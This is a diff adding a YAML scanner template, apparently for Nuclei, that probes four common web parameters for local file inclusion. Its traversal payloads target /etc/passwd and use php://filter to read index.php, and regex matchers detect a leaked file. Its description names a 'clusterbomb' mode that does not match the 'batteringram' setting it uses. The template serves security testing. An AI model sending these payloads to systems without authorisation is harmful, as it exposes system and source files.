@@ -1,0 +1,42 @@
+id: xpl-lfi-basic
+info:
+  name: "Local File Inclusion (LFI)"
+  author: imtaqin
+  severity: high
+  description: |
+    Classic path-traversal test across common vulnerable parameters.
+    Uses clusterbomb attack to combine traversal depths and payloads.
+  tags:
+    - lfi
+    - path-traversal
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?page={{fuzz}}"
+      - "{{BaseURL}}/?file={{fuzz}}"
+      - "{{BaseURL}}/download?file={{fuzz}}"
+      - "{{BaseURL}}/view.php?template={{fuzz}}"
+    attack: batteringram
+    payloads:
+      fuzz:
+        - "../../../../etc/passwd"
+        - "../../../../../../etc/passwd"
+        - "....//....//....//etc/passwd"
+        - "..%2f..%2f..%2fetc%2fpasswd"
+        - "php://filter/convert.base64-encode/resource=index.php"
+    stop_at_first_match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:[x*]:0:0:"
+        name: etc-passwd
+      - type: regex
+        part: body
+        regex:
+          - "^[A-Za-z0-9+/]{100,}={0,2}$"
+        name: base64-filter
